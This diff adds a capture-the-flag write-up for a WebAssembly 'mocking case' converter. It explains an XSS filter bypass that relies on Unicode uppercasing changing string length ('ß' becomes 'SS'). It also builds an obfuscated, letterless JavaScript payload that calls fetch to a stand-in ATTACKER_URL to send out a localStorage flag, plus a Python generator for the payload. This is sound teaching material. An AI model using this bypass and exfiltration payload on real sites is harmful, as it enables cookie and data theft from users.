@@ -1,0 +1,149 @@
+<h1>blazingfast</h1>
+
+<h2>Description</h2>
+
+<blockquote>
+  <p>I made a blazing fast MoCkInG CaSe converter!</p>
+</blockquote>
+
+<p>{% file src="../../.gitbook/assets/blazingfast (1).tar" %}</p>
+
+<h2>Solution</h2>
+
+<h3>Code Review</h3>
+
+<p>Looking at the site's JavaScript, we can see that the <code>demo()</code> function is called on the <code>demo</code> GET request parameter, which results in the setting of the <code>innerHTML</code> of the <code>result</code> element.</p>
+
+<p>```javascript
+function demo(str) {
+    document.getElementById('result').innerHTML = mock(str);
+}</p>
+
+<p>WebAssembly.instantiateStreaming(fetch('/blazingfast.wasm')).then(({ instance }) =&gt; { <br />
+    blazingfast = instance.exports;</p>
+
+<pre><code>document.getElementById('demo-submit').onclick = () =&gt; {
+    demo(document.getElementById('demo').value);
+}
+
+let query = new URLSearchParams(window.location.search).get('demo');
+
+if (query) {
+    document.getElementById('demo').value = query;
+    demo(query);
+}
+</code></pre>
+
+<p>})
+```</p>
+
+<p>The <code>mock()</code> function is a wrapper for the functions exposed by the WASM module. Interestingly, the <code>str.length</code> is measured <em>before</em> converting the string to upper case - this leads to <a href="https://stackoverflow.com/questions/49895784/change-to-length-with-touppercase">inconsistencies in length measurement of some Unicode characters</a>.</p>
+
+<p>Another interesting point to note is that when reading from the buffer, <code>str.length</code> is not used. Instead, characters are read until a null terminator is reached.</p>
+
+<p>```javascript
+function mock(str) {
+    blazingfast.init(str.length);</p>
+
+<pre><code>if (str.length &gt;= 1000) return 'Too long!';
+
+for (let c of str.toUpperCase()) {
+    if (c.charCodeAt(0) &gt; 128) return 'Nice try.';
+    blazingfast.write(c.charCodeAt(0));
+}
+
+if (blazingfast.mock() == 1) {
+    return 'No XSS for you!';
+} else {
+    let mocking = '', buf = blazingfast.read();
+
+    while(buf != 0) {
+        mocking += String.fromCharCode(buf);
+        buf = blazingfast.read();
+    }
+
+    return mocking;
+}
+</code></pre>
+
+<p>}
+```</p>
+
+<p>Notably, the <code>mock()</code> function in the WASM module also uses the initialized <code>length</code>, which is set to <code>str.length</code> to validate the buffer.&#x20;</p>
+
+<p>Therefore, if the <code>str.length</code> is shorter than the actual number of characters written into the buffer, the <code>mock()</code> function will not check the entire buffer, allowing the <code>&lt;&gt;&amp;"</code> characters.</p>
+
+<p>```c
+int length, ptr = 0;
+char buf[1000];</p>
+
+<p>void init(int size) {
+    length = size;
+    ptr = 0;
+}</p>
+
+<p>char read() {
+    return buf[ptr++];
+}</p>
+
+<p>void write(char c) {
+    buf[ptr++] = c;
+}</p>
+
+<p>int mock() {
+    for (int i = 0; i &lt; length; i ++) {
+        if (i % 2 == 1 &amp;&amp; buf[i] &gt;= 65 &amp;&amp; buf[i] &lt;= 90) {
+            buf[i] += 32;
+        }</p>
+
+<pre><code>    if (buf[i] == '&lt;' || buf[i] == '&gt;' || buf[i] == '&amp;' || buf[i] == '"') {
+        return 1;
+    }
+}
+
+ptr = 0;
+
+return 0;
+</code></pre>
+
+<p>}
+```</p>
+
+<h3>Problematic Unicode</h3>
+
+<p>When converting to upper case, some Unicode characters like <code>ß</code> turn into multiple characters instead. <code>ß</code> is converted to <code>SS</code>, which falls within the range of 0 to 128, passing the <code>if (c.charCodeAt(0) &gt; 128) return 'Nice try.';</code> check.</p>
+
+<p><img src="../../.gitbook/assets/image (89).png" alt="" /></p>
+
+<p>When <code>str.length</code> is initialized, the single character <code>ß</code> is used to calculate the length. However, when writing to the buffer, two characters <code>SS</code> are written instead. This allows us to bypass the XSS validation.&#x20;</p>
+
+<p>For instance, <code>ß&lt;</code> will have a length of 2, but is converted to <code>SS&lt;</code> when writing to the buffer. The <code>mock()</code> function uses the initialized length to iterate through the buffer in the <code>for (int i = 0; i &lt; length; i ++)</code> loop, missing out the final <code>&lt;</code> character.</p>
+
+<h3>Building the Payload</h3>
+
+<p>Our final hurdle lies in the fact that JavaScript is a case-sensitive language, and our payload is converted to upper case before being added to the <code>innerHTML</code>. For example, if we use <code>eval()</code> as our JavaScript payload, then <code>EVAL()</code> will be called - but the <code>EVAL</code> function is not defined.</p>
+
+<p>I found inspiration from <a href="https://techiavellian.com/constructing-an-xss-vector-using-no-letters">this post</a>, which shows how we can construct an XSS vector without using letters. In his payload, the following is used to build <code>""["sub"]["constructor"]("alert(1)")()</code>.</p>
+
+<p><code>javascript
+""[(!1+"")[3]+(!0+"")[2]+(''+{})[2]][(''+{})[5]+(''+{})[1]+((""[(!1+"")[3]+(!0+"")[2]+(''+{})[2]])+"")[2]+(!1+'')[3]+(!0+'')[0]+(!0+'')[1]+(!0+'')[2]+(''+{})[5]+(!0+'')[0]+(''+{})[1]+(!0+'')[1]](((!1+"")[1]+(!1+"")[2]+(!0+"")[3]+(!0+"")[1]+(!0+"")[0])+"(1)")()
+</code></p>
+
+<p>To modify this payload for our purposes, I just had to change the part where the <code>"alert(1)"</code> stirng is constructed, and replace it with octal characters for our JavaScript payload, which was</p>
+
+<p><code>javascript
+fetch('https://ATTACKER_URL/?' + localStorage.getItem('flag'))
+</code></p>
+
+<p>The following script generates the XSS payload, using <code>&lt;img src="x" onerror=PAYLOAD&gt;</code>.</p>
+
+<p>```python
+import urllib.parse</p>
+
+<h1>Obfuscation inspired by https://techiavellian.com/constructing-an-xss-vector-using-no-letters</h1>
+
+<p>payload = '<img src="x" onerror=\'""[(!1+"")[3]+(!0+"")[2]+(""+{})[2]][(""+{})[5]+(""+{})[1]+((""[(!1+"")[3]+(!0+"")[2]+(""+{})[2]])+"")[2]+(!1+"")[3]+(!0+"")[0]+(!0+"")[1]+(!0+"")[2]+(""+{})[5]+(!0+"")[0]+(""+{})[1]+(!0+"")[1]]("\146\145\164\143\150...")()\'>'
+special_char = 'ﬃ'</p>
+
+<p>print(urllib.parse.quote<em>plus(special</em>char * (len(payload) // 2 + 1) + payload))
+```</p>
